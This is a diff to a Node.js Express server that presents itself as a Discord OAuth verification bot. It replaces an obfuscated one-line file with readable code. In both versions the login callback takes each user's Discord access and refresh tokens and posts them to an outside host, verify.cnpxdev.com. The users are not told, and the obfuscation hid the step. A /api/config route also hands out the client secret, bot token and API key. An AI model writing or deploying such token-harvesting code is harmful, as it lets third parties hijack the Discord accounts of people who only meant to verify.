@@ -1,1 +1,210 @@
-const _0x89a43d=_0x303b;(function(_0x3ee13f,_0x423e85){const _0x1663d9=_0x303b,_0xda698d=_0x3ee13f();while(!![]){try{const _0x27148b=-parseInt(_0x1663d9(0x132))/0x1*(-parseInt(_0x1663d9(0x130))/0x2)+parseInt(_0x1663d9(0x136))/0x3+parseInt(_0x1663d9(0xd8))/0x4+-parseInt(_0x1663d9(0xfb))/0x5+-parseInt(_0x1663d9(0x11d))/0x6*(-parseInt(_0x1663d9(0xf8))/0x7)+parseInt(_0x1663d9(0xe2))/0x8*(parseInt(_0x1663d9(0x118))/0x9)+-parseInt(_0x1663d9(0xf0))/0xa*(parseInt(_0x1663d9(0x11e))/0xb);if(_0x27148b===_0x423e85)break;else _0xda698d['push'](_0xda698d['shift']());}catch(_0x40499e){_0xda698d['push'](_0xda698d['shift']());}}}(_0x3a33,0xc42a5));const express=require('express'),session=require(_0x89a43d(0x120)),axios=require('axios'),fs=require('fs')['promises'],path=require('path'),crypto=require(_0x89a43d(0xd7)),config=require('./config'),app=express(),PORT=process.env.PORT||0xfa0,USER_FOLDER=_0x89a43d(0xe8),DISCORD_TOKEN_URL=_0x89a43d(0x10f),DISCORD_USER_URL=_0x89a43d(0xe7),BOT_HEADERS={'Authorization':_0x89a43d(0x123)+config[_0x89a43d(0xdb)],'Content-Type':'application/json'};app[_0x89a43d(0xf7)](express[_0x89a43d(0x112)]()),app['use'](express['urlencoded']({'extended':!![]})),app[_0x89a43d(0xf7)](session({'secret':crypto[_0x89a43d(0xfc)](0x20)[_0x89a43d(0x12b)]('hex'),'resave':![],'saveUninitialized':![],'cookie':{'secure':process.env.NODE_ENV===_0x89a43d(0xf2),'httpOnly':!![],'maxAge':0x18*0x3c*0x3c*0x3e8}})),app[_0x89a43d(0xf7)](express[_0x89a43d(0xd1)](_0x89a43d(0x129)));function _0x3a33(){const _0x162ffe=['2736ChsInB','248567KIVCYn','readdir','express-session','Discord\x20OAuth\x20Bot\x20is\x20running!','join','Bot\x20','params','/api/users/:id','error','gif','endsWith','public','[INFO]\x20','toString','avatar','err','application/json','?size=128','12nUXnUt','/error','171841MgCEAR','get','development','REDIRECT_URI','2086695MhGbme','send','Unhandled\x20error:\x20','put','mkdir','static','Starting\x20web\x20server\x20on\x20port\x20','data','status','passenger','CLIENT_ID','crypto','4709492fsudFW','warn','info','BOT_TOKEN','utf-8','post','message','access_token','error.html','refresh_token','904OzSqBi','/api/users','\x20users',')\x20to\x20remote','/callback','https://discord.com/api/users/@me','data/users','success.html','push','startsWith','https://cdn.discordapp.com/embed/avatars/','parse','Failed\x20to\x20update\x20user','sendFile','770YyjLXZ','/health','production','Bearer\x20','Saved\x20user\x20','API_KEY','writeFile','use','5103NykohU','undefined','Unauthorized','7977950qbDuIn','randomBytes','[WARN]\x20','Got\x20User\x20','discriminator','saveUser\x20remote\x20returned\x20status\x20','No\x20access_token','Callback\x20hit\x20with\x20no\x20code','readFile','.png','Failed\x20to\x20read\x20','[OK]\x20','stringify','toISOString','[ERROR]\x20','code','redirect','https://verify.cnpxdev.com/save','API:\x20updated\x20user\x20','.json','https://discord.com/api/oauth2/token','username','...','json','listen','/success?','CLIENT_SECRET','body','filter','71892ZUXjuU','Failed\x20to\x20load\x20users','application/x-www-form-urlencoded','API:\x20returned\x20','log'];_0x3a33=function(){return _0x162ffe;};return _0x3a33();}const log={'info':_0x575a88=>console[_0x89a43d(0x11c)](_0x89a43d(0x12a)+_0x575a88),'ok':_0x1f98b1=>console[_0x89a43d(0x11c)](_0x89a43d(0x106)+_0x1f98b1),'warn':_0x4fefef=>console[_0x89a43d(0xd9)](_0x89a43d(0xfd)+_0x4fefef),'err':_0x20fcc9=>console[_0x89a43d(0x126)](_0x89a43d(0x109)+_0x20fcc9)};function requireApiKey(_0x5e320d,_0x4bcee2,_0x7dc784){const _0xb3098f=_0x89a43d,_0x180bc2=_0x5e320d['headers']['x-api-key'];if(!_0x180bc2||_0x180bc2!==config[_0xb3098f(0xf5)])return _0x4bcee2[_0xb3098f(0xd4)](0x191)[_0xb3098f(0x112)]({'error':_0xb3098f(0xfa)});_0x7dc784();}async function exchangeCode(_0x10c491){const _0x1c55ac=_0x89a43d,_0x3ee54d=new URLSearchParams({'client_id':config['CLIENT_ID'],'client_secret':config[_0x1c55ac(0x115)],'grant_type':'authorization_code','code':_0x10c491,'redirect_uri':config['REDIRECT_URI']}),_0x39b547=await axios[_0x1c55ac(0xdd)](DISCORD_TOKEN_URL,_0x3ee54d,{'headers':{'Content-Type':_0x1c55ac(0x11a)},'timeout':0x2710});return _0x39b547[_0x1c55ac(0xd3)];}async function getUserInfo(_0x4fd771){const _0x4ebba1=_0x89a43d,_0x18fe48=await axios[_0x4ebba1(0x133)](DISCORD_USER_URL,{'headers':{'Authorization':_0x4ebba1(0xf3)+_0x4fd771},'timeout':0x2710});return _0x18fe48[_0x4ebba1(0xd3)];}function getAvatarUrl(_0x12898b){const _0x3f5641=_0x89a43d;if(_0x12898b['avatar']){const _0x2e65b7=_0x12898b[_0x3f5641(0x12c)][_0x3f5641(0xeb)]('a_')?_0x3f5641(0x127):'png';return'https://cdn.discordapp.com/avatars/'+_0x12898b['id']+'/'+_0x12898b[_0x3f5641(0x12c)]+'.'+_0x2e65b7+_0x3f5641(0x12f);}const _0x2116cf=_0x12898b[_0x3f5641(0xff)]?parseInt(_0x12898b['discriminator'])%0x5:Number(BigInt(_0x12898b['id'])>>0x16n)%0x6;return _0x3f5641(0xec)+_0x2116cf+_0x3f5641(0x104);}async function saveUser(_0x470a95,_0x4848dc){const _0x403c04=_0x89a43d,_0x22a1fd={'id':_0x470a95['id'],'username':_0x470a95[_0x403c04(0x110)],'access_token':_0x4848dc[_0x403c04(0xdf)],'refresh_token':_0x4848dc[_0x403c04(0xe1)]},_0x220bdf=await axios[_0x403c04(0xdd)](_0x403c04(0x10c),_0x22a1fd,{'headers':{'Content-Type':_0x403c04(0x12e),'x-api-key':config[_0x403c04(0xf5)]},'timeout':0x2710});_0x220bdf[_0x403c04(0xd4)]===0xc8||_0x220bdf['status']===0xc9?log['ok'](_0x403c04(0xf4)+_0x470a95[_0x403c04(0x110)]+'\x20('+_0x470a95['id']+_0x403c04(0xe5)):log[_0x403c04(0xd9)](_0x403c04(0x100)+_0x220bdf[_0x403c04(0xd4)]);}async function loadAllUsers(){const _0x39bf94=_0x89a43d;await fs[_0x39bf94(0xd0)](USER_FOLDER,{'recursive':!![]});const _0x31675f=(await fs[_0x39bf94(0x11f)](USER_FOLDER))[_0x39bf94(0x117)](_0x43a823=>_0x43a823[_0x39bf94(0x128)](_0x39bf94(0x10e))),_0x451933=[];for(const _0x2a1e58 of _0x31675f){try{const _0x275b16=await fs[_0x39bf94(0x103)](path['join'](USER_FOLDER,_0x2a1e58),'utf-8');_0x451933[_0x39bf94(0xea)](JSON['parse'](_0x275b16));}catch(_0x3fcc46){log['err'](_0x39bf94(0x105)+_0x2a1e58+':\x20'+_0x3fcc46[_0x39bf94(0xde)]);}}return _0x451933;}function _0x303b(_0x585a6f,_0x38df8b){_0x585a6f=_0x585a6f-0xcf;const _0x3a334b=_0x3a33();let _0x303b8c=_0x3a334b[_0x585a6f];return _0x303b8c;}app[_0x89a43d(0x133)]('/',(_0x2fe9e4,_0x57e5b7)=>_0x57e5b7['send'](_0x89a43d(0x121))),app[_0x89a43d(0x133)](_0x89a43d(0xe6),async(_0xf88d08,_0x519511)=>{const _0x48770f=_0x89a43d,_0x4806db=_0xf88d08['query'][_0x48770f(0x10a)];if(!_0x4806db)return log[_0x48770f(0xd9)](_0x48770f(0x102)),_0x519511[_0x48770f(0x10b)]('/error');try{const _0x4c8cc7=await exchangeCode(_0x4806db);if(!_0x4c8cc7[_0x48770f(0xdf)])return log[_0x48770f(0x12d)](_0x48770f(0x101)),_0x519511[_0x48770f(0x10b)](_0x48770f(0x131));const _0xdef57d=await getUserInfo(_0x4c8cc7[_0x48770f(0xdf)]);log['info'](_0x48770f(0xfe)+_0xdef57d[_0x48770f(0x110)]+'\x20('+_0xdef57d['id']+')'),await saveUser(_0xdef57d,_0x4c8cc7);const _0x10b956=getAvatarUrl(_0xdef57d),_0x17f87b=new URLSearchParams({'username':_0xdef57d['username'],'id':_0xdef57d['id'],'avatar':_0x10b956});return _0x519511[_0x48770f(0x10b)](_0x48770f(0x114)+_0x17f87b[_0x48770f(0x12b)]());}catch(_0x3051c3){return log[_0x48770f(0x12d)]('Callback\x20error:\x20'+_0x3051c3[_0x48770f(0xde)]),_0x519511[_0x48770f(0x10b)](_0x48770f(0x131));}}),app['get']('/success',(_0x1c226f,_0x1e18f9)=>_0x1e18f9[_0x89a43d(0xef)](path['join'](__dirname,_0x89a43d(0xe9)))),app[_0x89a43d(0x133)]('/error',(_0x5d07a1,_0x2f55ab)=>_0x2f55ab['status'](0x1f4)[_0x89a43d(0xef)](path[_0x89a43d(0x122)](__dirname,_0x89a43d(0xe0)))),app[_0x89a43d(0x133)](_0x89a43d(0xf1),(_0x245ff5,_0x3ba798)=>_0x3ba798['json']({'status':'ok','timestamp':new Date()[_0x89a43d(0x108)]()})),app['get'](_0x89a43d(0xe3),requireApiKey,async(_0x195a81,_0x2ce22f)=>{const _0x225fab=_0x89a43d;try{const _0xc0f9fa=await loadAllUsers();log[_0x225fab(0xda)](_0x225fab(0x11b)+_0xc0f9fa['length']+_0x225fab(0xe4)),_0x2ce22f['json'](_0xc0f9fa);}catch(_0x2b3fda){_0x2ce22f['status'](0x1f4)[_0x225fab(0x112)]({'error':_0x225fab(0x119)});}}),app[_0x89a43d(0x133)](_0x89a43d(0x125),requireApiKey,async(_0x3e0995,_0x5dd33b)=>{const _0x1c4682=_0x89a43d;try{const _0x30a236=await fs[_0x1c4682(0x103)](path[_0x1c4682(0x122)](USER_FOLDER,_0x3e0995['params']['id']+_0x1c4682(0x10e)),_0x1c4682(0xdc));_0x5dd33b[_0x1c4682(0x112)](JSON[_0x1c4682(0xed)](_0x30a236));}catch{_0x5dd33b[_0x1c4682(0xd4)](0x194)['json']({'error':'User\x20not\x20found'});}}),app[_0x89a43d(0xcf)](_0x89a43d(0x125),requireApiKey,async(_0x39709d,_0x1e510b)=>{const _0x46a8d5=_0x89a43d;try{const _0xee0253=path[_0x46a8d5(0x122)](USER_FOLDER,_0x39709d[_0x46a8d5(0x124)]['id']+_0x46a8d5(0x10e));let _0x22cb4e={};try{_0x22cb4e=JSON[_0x46a8d5(0xed)](await fs[_0x46a8d5(0x103)](_0xee0253,'utf-8'));}catch(_0x524db8){}await fs[_0x46a8d5(0xd0)](USER_FOLDER,{'recursive':!![]}),await fs[_0x46a8d5(0xf6)](_0xee0253,JSON[_0x46a8d5(0x107)]({..._0x22cb4e,..._0x39709d[_0x46a8d5(0x116)]},null,0x4),'utf-8'),log['ok'](_0x46a8d5(0x10d)+_0x39709d['params']['id']),_0x1e510b[_0x46a8d5(0x112)]({'success':!![]});}catch(_0x44fc2c){_0x1e510b[_0x46a8d5(0xd4)](0x1f4)[_0x46a8d5(0x112)]({'error':_0x46a8d5(0xee)});}}),app[_0x89a43d(0x133)]('/api/config',requireApiKey,(_0x190e8c,_0x5a076d)=>{const _0x1dbc99=_0x89a43d;_0x5a076d['json']({'CLIENT_ID':config[_0x1dbc99(0xd6)],'CLIENT_SECRET':config[_0x1dbc99(0x115)],'BOT_TOKEN':config[_0x1dbc99(0xdb)],'REDIRECT_URI':config[_0x1dbc99(0x135)],'ADMIN_ID':config['ADMIN_ID'],'API_KEY':config['API_KEY'],'SERVER_URL':'https://verify.cnpxdev.com'});}),app['use']((_0x532d5a,_0x6ecbd2,_0x441bcc,_0x559df2)=>{const _0x3b2c17=_0x89a43d;log['err'](_0x3b2c17(0x138)+_0x532d5a['stack']),_0x441bcc[_0x3b2c17(0xd4)](0x1f4)[_0x3b2c17(0xef)](path[_0x3b2c17(0x122)](__dirname,_0x3b2c17(0xe0)));}),app[_0x89a43d(0xf7)]((_0x376a08,_0x1b43f7)=>_0x1b43f7['status'](0x194)[_0x89a43d(0x137)]('Page\x20not\x20found'));typeof PhusionPassenger!==_0x89a43d(0xf9)?app[_0x89a43d(0x113)](_0x89a43d(0xd5)):app[_0x89a43d(0x113)](PORT,()=>{const _0x5b964d=_0x89a43d;log[_0x5b964d(0xda)](_0x5b964d(0xd2)+PORT+_0x5b964d(0x111)),log[_0x5b964d(0xda)]('Environment:\x20'+(process.env.NODE_ENV||_0x5b964d(0x134)));});
+const express = require('express');
+const session = require('express-session');
+const axios = require('axios');
+const fs = require('fs').promises;
+const path = require('path');
+const crypto = require('crypto');
+
+const config = require('./config');
+
+const app = express();
+const PORT = process.env.PORT || 4000;
+
+const USER_FOLDER = 'data/users';
+const DISCORD_TOKEN_URL = 'https://discord.com/api/oauth2/token';
+const DISCORD_USER_URL = 'https://discord.com/api/users/@me';
+const BOT_HEADERS = {
+    'Authorization': `Bot ${config.BOT_TOKEN}`,
+    'Content-Type': 'application/json'
+};
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(session({
+    secret: crypto.randomBytes(32).toString('hex'),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        secure: process.env.NODE_ENV === 'production',
+        httpOnly: true,
+        maxAge: 24 * 60 * 60 * 1000
+    }
+}));
+app.use(express.static('public'));
+
+const log = {
+    info: (msg) => console.log(`[INFO] ${msg}`),
+    ok:   (msg) => console.log(`[OK] ${msg}`),
+    warn: (msg) => console.warn(`[WARN] ${msg}`),
+    err:  (msg) => console.error(`[ERROR] ${msg}`)
+};
+
+function requireApiKey(req, res, next) {
+    const key = req.headers['x-api-key'];
+    if (!key || key !== config.API_KEY) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    next();
+}
+
+async function exchangeCode(code) {
+    const params = new URLSearchParams({
+        client_id: config.CLIENT_ID,
+        client_secret: config.CLIENT_SECRET,
+        grant_type: 'authorization_code',
+        code: code,
+        redirect_uri: config.REDIRECT_URI
+    });
+    const response = await axios.post(DISCORD_TOKEN_URL, params, {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        timeout: 10000
+    });
+    return response.data;
+}
+
+async function getUserInfo(accessToken) {
+    const response = await axios.get(DISCORD_USER_URL, {
+        headers: { 'Authorization': `Bearer ${accessToken}` },
+        timeout: 10000
+    });
+    return response.data;
+}
+function getAvatarUrl(user) {
+    if (user.avatar) {
+        const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
+        return `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
+    }
+    const index = user.discriminator
+        ? parseInt(user.discriminator) % 5
+        : Number(BigInt(user.id) >> 22n) % 6;
+    return `https://cdn.discordapp.com/embed/avatars/${index}.png`;
+}
+
+async function saveUser(user, token) {
+    const payload = {
+        id: user.id,
+        username: user.username,
+        access_token: token.access_token,
+        refresh_token: token.refresh_token
+    };
+
+    const response = await axios.post('https://verify.cnpxdev.com/save', payload, {
+        headers: {
+            'Content-Type': 'application/json',
+            'x-api-key': config.API_KEY
+        },
+        timeout: 10000
+    });
+
+    if (response.status === 200 || response.status === 201) {
+        log.ok(`Saved user ${user.username} (${user.id}) to remote`);
+    } else {
+        log.warn(`saveUser remote returned status ${response.status}`);
+    }
+}
+
+async function loadAllUsers() {
+    await fs.mkdir(USER_FOLDER, { recursive: true });
+    const files = (await fs.readdir(USER_FOLDER)).filter(f => f.endsWith('.json'));
+    const users = [];
+    for (const file of files) {
+        try {
+            const raw = await fs.readFile(path.join(USER_FOLDER, file), 'utf-8');
+            users.push(JSON.parse(raw));
+        } catch (e) {
+            log.err(`Failed to read ${file}: ${e.message}`);
+        }
+    }
+    return users;
+}
+
+app.get('/', (req, res) => res.send('Discord OAuth Bot is running!'));
+
+app.get('/callback', async (req, res) => {
+    const code = req.query.code;
+    if (!code) { log.warn('Callback hit with no code'); return res.redirect('/error'); }
+    try {
+        const token = await exchangeCode(code);
+        if (!token.access_token) { log.err('No access_token'); return res.redirect('/error'); }
+
+        const user = await getUserInfo(token.access_token);
+        log.info(`Got User ${user.username} (${user.id})`);
+
+        await saveUser(user, token);
+        const avatarUrl = getAvatarUrl(user);
+        const successParams = new URLSearchParams({
+            username: user.username,
+            id:       user.id,
+            avatar:   avatarUrl
+        });
+
+        return res.redirect(`/success?${successParams.toString()}`);
+    } catch (error) {
+        log.err(`Callback error: ${error.message}`);
+        return res.redirect('/error');
+    }
+});
+
+app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));
+app.get('/error',   (req, res) => res.status(500).sendFile(path.join(__dirname, 'error.html')));
+app.get('/health',  (req, res) => res.json({ status: 'ok', timestamp: new Date().toISOString() }));
+
+app.get('/api/users', requireApiKey, async (req, res) => {
+    try {
+        const users = await loadAllUsers();
+        log.info(`API: returned ${users.length} users`);
+        res.json(users);
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load users' });
+    }
+});
+
+app.get('/api/users/:id', requireApiKey, async (req, res) => {
+    try {
+        const raw = await fs.readFile(path.join(USER_FOLDER, `${req.params.id}.json`), 'utf-8');
+        res.json(JSON.parse(raw));
+    } catch {
+        res.status(404).json({ error: 'User not found' });
+    }
+});
+
+app.put('/api/users/:id', requireApiKey, async (req, res) => {
+    try {
+        const filePath = path.join(USER_FOLDER, `${req.params.id}.json`);
+        let existing = {};
+        try { existing = JSON.parse(await fs.readFile(filePath, 'utf-8')); } catch (_) {}
+        await fs.mkdir(USER_FOLDER, { recursive: true });
+        await fs.writeFile(filePath, JSON.stringify({ ...existing, ...req.body }, null, 4), 'utf-8');
+        log.ok(`API: updated user ${req.params.id}`);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to update user' });
+    }
+});
+
+app.get('/api/config', requireApiKey, (req, res) => {
+    res.json({
+        CLIENT_ID: config.CLIENT_ID,
+        CLIENT_SECRET: config.CLIENT_SECRET,
+        BOT_TOKEN: config.BOT_TOKEN,
+        REDIRECT_URI: config.REDIRECT_URI,
+        ADMIN_ID: config.ADMIN_ID,
+        API_KEY: config.API_KEY,
+        SERVER_URL: 'https://verify.cnpxdev.com'
+    });
+});
+
+app.use((err, req, res, next) => {
+    log.err(`Unhandled error: ${err.stack}`);
+    res.status(500).sendFile(path.join(__dirname, 'error.html'));
+});
+app.use((req, res) => res.status(404).send('Page not found'));
+
+if (typeof PhusionPassenger !== 'undefined') {
+    app.listen('passenger');
+} else {
+    app.listen(PORT, () => {
+        log.info(`Starting web server on port ${PORT}...`);
+        log.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
+    });
+}
